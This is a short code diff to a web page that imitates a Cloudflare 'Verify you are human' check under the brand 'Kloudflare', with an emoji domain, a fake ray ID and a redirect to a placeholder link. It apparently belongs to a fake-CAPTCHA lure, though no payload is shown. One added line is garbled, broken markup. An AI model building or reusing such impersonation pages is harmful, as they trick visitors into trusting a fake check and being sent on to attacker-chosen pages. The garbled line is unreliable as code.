@@ -1,6 +1,6 @@
 const KL_CONFIG = {
   domain: "🗿🤠.ws",
-  redirectUrl: new URL("./randomBuild.html", window.location.href).href,
+  redirectUrl: new URL("./TEST", window.location.href).href, // Fyll inn link
   city: "could not fetch",
   brand: "Kloudflare",
   rayLength: 16,
@@ -32,7 +32,8 @@ function buildApp(rayId) {
           <div class="left-area" id="left-area">
             <input type="checkbox" id="human-check" aria-label="Human verification checkbox">
             <label id="verify-label" for="human-check">Verify you are human</label>
-            <div class="spinner" id="spinner" role="status" aria-label="Verifying"></div>
+            
+c*r**r="status" aria-label="Verifying">
           </div>
 
           <div class="right-area">
